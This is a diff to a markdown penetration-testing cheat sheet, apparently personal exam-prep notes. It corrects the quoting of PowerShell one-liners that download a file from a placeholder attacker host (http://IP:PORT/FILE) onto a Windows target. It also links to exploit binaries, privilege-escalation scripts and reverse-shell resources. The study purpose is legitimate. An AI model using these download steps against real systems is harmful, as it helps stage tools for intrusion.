@@ -13,7 +13,7 @@
 1. Local server in current directory: `python3 -m http.server PORT`
 
 2. Local server in specified directory:
-
+   
     `python3 -m http.server PORT --directory DIRECTORY`
 
 ## Msfvenom CheatSheet
@@ -48,7 +48,6 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
 
 [exploitdb-bin-sploits/bin-sploits at master · offensive-security/exploitdb-bin-sploits · GitHub](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
 
-
 ### Windows PrivEsc CheatSheet
 
 [OSCP_Vini2.ctb (sejalivre.org)](https://sejalivre.org/OSCP/index.html#)
@@ -72,11 +71,11 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
    ```
 
 2. ```powershell
-   powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'C:\FULL\PATH\FILE')"
+   powershell -c (new-object System.Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'C:\FULL\PATH\FILE')
    ```
 
 3. ```powershell
-   powershell.exe -command iwr -Uri http://IP:PORT/FILE -OutFile C:\PATH\FILE"
+   powershell.exe -command iwr -Uri http://IP:PORT/FILE -OutFile "C:\PATH\FILE"
    ```
 
 4. ```powershell
@@ -122,5 +121,6 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
 [Kerberos Attack](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
 
 ### Reverse shell
+
 [Reverse Shell Generator](https://www.revshells.com/)
 [Reverse shell cheat sheet PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
